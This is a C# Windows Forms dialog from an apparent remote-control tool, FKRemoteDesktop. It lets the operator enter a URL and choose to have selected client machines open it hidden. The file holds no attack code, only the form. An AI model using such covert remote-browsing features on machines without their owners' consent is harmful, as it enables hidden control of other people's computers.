using FKRemoteDesktop.Helpers;
using System;
using System.Windows.Forms;
//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Forms
{
    public partial class VisitWebsiteForm : Form
    {
        public string Url { get; set; }
        public bool Hidden { get; set; }
        private readonly int _selectedClients;

        public VisitWebsiteForm(int selected)
        {
            _selectedClients = selected;

            InitializeComponent();
        }

        private void btnVisitWebsite_Click(object sender, EventArgs e)
        {
            Url = txtURL.Text;
            Hidden = chkVisitHidden.Checked;

            this.DialogResult = DialogResult.OK;
            this.Close();
        }

        private void VisitWebsiteForm_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("FK远控服务器端 - 打开远程网页", _selectedClients);
        }
    }
}
